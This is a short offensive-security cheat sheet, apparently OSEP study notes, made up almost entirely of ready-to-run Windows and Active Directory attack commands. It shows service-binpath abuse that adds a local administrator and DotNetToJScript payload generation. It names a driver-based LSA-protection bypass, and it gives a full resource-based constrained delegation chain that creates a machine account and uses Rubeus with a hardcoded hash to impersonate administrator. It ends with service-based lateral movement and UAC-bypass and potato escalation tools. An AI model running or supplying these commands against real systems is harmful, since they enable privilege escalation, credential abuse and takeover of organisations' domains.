Service CheatSheet
---------------------
sc config SNMPTRAP binpath= "cmd.exe /c net localgroup administrators john /add" start= "demand" obj= "NT AUTHORITY\SYSTEM" password= ""

HTA JS PAYLOAD
---------------------
DotNetToJScript

DotNetToJScript.exe ExampleAssembly.dll --lang=JScript --ver=4 -o payload.js

Run the combined ligolo agent with ApplockerBypass
-----------------------

If LSA Protection 
--------------------
PPLKiller.exe /installDriver

RBCD
--------------------
```powershell
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))" 
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer file05 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/file05 /ptt
```

Lateral Movement
---------------------
 -> https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/Fileless%20Lateral%20Movement

```powershell
lat.exe <server> <service name> <payload.exe>
Lat.exe file05 SensorService “C:\windows\tasks\inj.exe”
``` 

uacbypass.ps1
SigmaPotato.exe
